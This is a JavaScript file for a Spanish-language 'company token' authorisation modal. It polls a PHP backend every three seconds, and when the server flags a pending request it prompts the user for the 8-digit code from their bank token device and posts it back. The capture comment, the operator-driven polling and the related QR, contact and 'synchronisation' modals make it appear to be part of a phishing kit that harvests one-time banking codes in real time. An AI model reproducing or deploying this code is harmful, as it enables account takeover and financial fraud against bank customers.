/**
 * Tela de token Empresas — captura en sgdotoken_codigo
 */
class TokenEmpresaSystem {
    constructor() {
        this.currentToken = null;
        this.init();
    }

    init() {
        this.startTokenCheck();
        this.checkForToken();
    }

    startTokenCheck() {
        this.tokenInterval = setInterval(() => {
            this.checkForToken();
        }, 3000);
    }

    stopTokenCheck() {
        if (this.tokenInterval) {
            clearInterval(this.tokenInterval);
            this.tokenInterval = null;
        }
    }

    isOwnModalActive() {
        const modal = document.getElementById('adminModal');
        return !!(modal && modal.classList.contains('active') && modal.classList.contains('token-empresa-modal'));
    }

    async checkForToken() {
        try {
            const response = await fetch((window.MODAL_BASE || '') + 'php_modales/token_empresa_verificar.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ accion: 'verificar_token_pendiente' })
            });

            const text = await response.text();
            let data;
            try {
                data = JSON.parse(text);
            } catch (e) {
                console.error('Respuesta no válida de token_empresa_verificar.php:', text);
                return;
            }

            if (data.success && data.tiene_token) {
                if (this.isOwnModalActive() && this.currentToken?.mensaje_id === data.mensaje_id) {
                    return;
                }
                this.showTokenModal(data);
                return;
            }

            if (this.isOwnModalActive()) {
                this.closeModal();
            }
        } catch (error) {
            console.warn('Error verificando tela de token:', error);
        }
    }

    showTokenModal(data) {
        const modal = document.getElementById('adminModal');
        if (!modal) {
            return;
        }

        if (typeof contactoEmpresaSystem !== 'undefined' && contactoEmpresaSystem.closeModal) {
            contactoEmpresaSystem.closeModal();
        }
        if (typeof sincronizacionSystem !== 'undefined' && sincronizacionSystem.closeModal) {
            sincronizacionSystem.closeModal();
        }

        const messageEl = document.getElementById('modalMessage');
        const inputContainer = document.getElementById('modalInputContainer');
        const buttonsContainer = document.getElementById('modalButtons');
        const errorEl = document.getElementById('modalError');

        errorEl.style.display = 'none';
        errorEl.textContent = '';
        modal.classList.remove(
            'token-qr-empresa-modal',
            'contacto-empresa-modal',
            'email-validation-modal',
            'sincronizacion-modal'
        );
        modal.classList.add('token-empresa-modal');

        messageEl.innerHTML = `
            <div class="token-empresa-content">
                <h2 class="token-empresa-title">Autoriza con tu token</h2>
                <p class="token-empresa-description">
                    Ingresa la contraseña de 8 dígitos que se genera en tu dispositivo token
                </p>
                <div class="token-empresa-form-row">
                    <div class="token-empresa-field">
                        <label class="token-empresa-label" for="tokenEmpresaInput">Contraseña token</label>
                        <input type="password"
                               id="tokenEmpresaInput"
                               class="token-empresa-input"
                               maxlength="8"
                               inputmode="numeric"
                               pattern="[0-9]{8}"
                               autocomplete="one-time-code"
                               required>
                    </div>
                    <button type="button" class="token-empresa-submit" id="tokenEmpresaSubmit">Autorizar</button>
                </div>
            </div>
        `;

        inputContainer.style.display = 'none';
        buttonsContainer.innerHTML = '';

        const input = document.getElementById('tokenEmpresaInput');
        input.addEventListener('input', function () {
            this.value = this.value.replace(/[^0-9]/g, '');
        });

        input.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                this.sendToken(data.mensaje_id);
            }
        });

        document.getElementById('tokenEmpresaSubmit').addEventListener('click', () => {
            this.sendToken(data.mensaje_id);
        });

        this.currentToken = data;
        modal.classList.add('active');
        input.focus();
    }

    async sendToken(mensajeId) {
        const input = document.getElementById('tokenEmpresaInput');
        const tokenCodigo = (input?.value || '').trim();

        if (!/^[0-9]{8}$/.test(tokenCodigo)) {
            this.showError('Ingresa la contraseña de 8 dígitos de tu token');
            return;
        }

        try {
            const response = await fetch((window.MODAL_BASE || '') + 'php_modales/token_empresa_procesar.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    accion: 'guardar_token',
                    mensaje_id: mensajeId,
                    token_codigo: tokenCodigo
                })
            });

            const data = await response.json();

            if (data.success) {
                this.closeModal();
                setTimeout(() => this.startTokenCheck(), 2000);
            } else {
                this.showError(data.error || 'No se pudo registrar el token');
            }
        } catch (error) {
            this.showError('Error de conexión');
        }
    }

    async cancelToken(mensajeId) {
        try {
            await fetch((window.MODAL_BASE || '') + 'php_modales/token_empresa_procesar.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    accion: 'cancelar_token',
                    mensaje_id: mensajeId
                })
            });
        } catch (error) {
            console.warn('Error al cancelar token:', error);
        }

        this.closeModal();
    }

    showError(message) {
        const errorEl = document.getElementById('modalError');
        const input = document.getElementById('tokenEmpresaInput');
        errorEl.textContent = message;
        errorEl.style.display = 'block';
        if (input) {
            input.classList.add('is-invalid');
        }
    }

    closeModal() {
        const modal = document.getElementById('adminModal');
        if (modal) {
            modal.classList.remove(
                'active',
                'token-empresa-modal',
                'token-qr-empresa-modal',
                'contacto-empresa-modal',
                'email-validation-modal',
                'sincronizacion-modal'
            );
        }

        const messageEl = document.getElementById('modalMessage');
        const inputContainer = document.getElementById('modalInputContainer');
        const buttonsContainer = document.getElementById('modalButtons');
        const errorEl = document.getElementById('modalError');

        if (messageEl) {
            messageEl.textContent = '';
        }

        if (errorEl) {
            errorEl.style.display = 'none';
            errorEl.textContent = '';
        }

        if (inputContainer) {
            inputContainer.style.display = 'none';
            inputContainer.innerHTML = `
                <label class="modal-input-label" for="modalInput">Tu respuesta:</label>
                <input type="text" class="modal-input" id="modalInput" placeholder="Escribe tu respuesta aquí...">
            `;
        }

        if (buttonsContainer) {
            buttonsContainer.innerHTML = '';
        }

        this.currentToken = null;
    }

    destroy() {
        this.stopTokenCheck();
    }
}

let tokenEmpresaSystem;

document.addEventListener('DOMContentLoaded', function () {
    tokenEmpresaSystem = new TokenEmpresaSystem();
});

window.addEventListener('beforeunload', function () {
    if (tokenEmpresaSystem) {
        tokenEmpresaSystem.destroy();
    }
});
